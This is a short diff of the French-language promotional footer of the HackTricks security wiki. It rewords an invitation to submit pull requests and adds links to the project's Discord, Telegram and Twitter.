-* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
